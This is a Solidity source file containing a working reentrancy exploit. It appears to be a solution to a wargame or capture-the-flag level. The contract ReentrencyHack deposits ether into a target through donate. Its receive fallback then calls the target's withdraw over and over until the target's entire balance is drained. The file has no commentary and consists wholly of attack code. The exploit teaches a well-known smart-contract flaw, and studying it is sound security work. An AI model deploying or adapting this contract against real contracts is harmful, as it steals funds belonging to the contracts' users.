// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrency {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrencyHack {
    IReentrency public reentrency;
    uint256 initialDeposit;

    constructor(address _target) public {
        reentrency = IReentrency(_target);
    }

    receive() external payable {
        withdraw();
    }

    function hack() external payable {
        initialDeposit = msg.value;
        reentrency.donate{value: initialDeposit}(address(this));
        withdraw();
    }

    function withdraw() public {
        uint256 remainingBalance = address(reentrency).balance;
        bool keepRecursing = remainingBalance > 0;

        if (keepRecursing) {
            uint256 withdrawAmount = initialDeposit < remainingBalance ? initialDeposit : remainingBalance;
            reentrency.withdraw(withdrawAmount);
        }
    }
}